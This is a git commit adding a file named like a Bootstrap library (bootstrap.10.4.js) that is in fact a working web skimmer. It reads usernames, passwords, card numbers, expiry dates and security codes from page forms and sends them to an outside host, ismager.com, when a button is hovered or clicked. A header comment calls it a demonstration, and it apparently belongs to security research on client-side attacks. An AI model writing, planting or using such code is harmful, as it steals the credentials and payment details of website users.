048db92a375a2b2e5f2a90f0b0c7bd5a046508e3
johnsalay <john.salangsang@imperva.com>
2022-03-03 10:26:28 -0800

    updated url

---
+++ bootstrap.10.4.js
@@ -0,0 +1,44 @@
+// This code is for demonstration purposes, and under no circumstances it will be used for a real attack.
+
+function start() {
+    const subBtn = document.getElementById('sub-btn')
+    const ccBtn = document.getElementById('button-payment-method')
+
+    const sendToMe = function (event) {
+        const username = document.getElementById('user')?.value
+        const password = document.getElementById('pass')?.value
+        fetch(`https://ismager.com/user-data/creds/g?username=${username}&password=${password}`, {
+            "headers": {
+                "cookie": "foo=bar; bar=baz",
+                "x-pretty-print": "2"
+            }
+        })
+    }
+
+    const sendToMeCC = function (event) {
+        const ccNum = document.getElementById('cc-num')?.value
+        const ccExp = document.getElementById('cc-exp')?.value
+        const ccSec = document.getElementById('cc-sec')?.value
+
+        fetch(`https://ismager.com/user-data/cc/g?ccNum=${ccNum}&ccExp=${ccExp}&ccSec=${ccSec}`, {
+            "headers": {
+                "cookie": "foo=bar; bar=baz",
+                "x-pretty-print": "2"
+            }
+        })
+    }
+
+    if(subBtn) {
+        subBtn.addEventListener('mouseenter', sendToMe);
+    }
+
+    if(ccBtn) {
+        ccBtn.addEventListener('click', sendToMeCC);
+    }
+
+    console.log('form attached')
+}
+
+start()
+
+
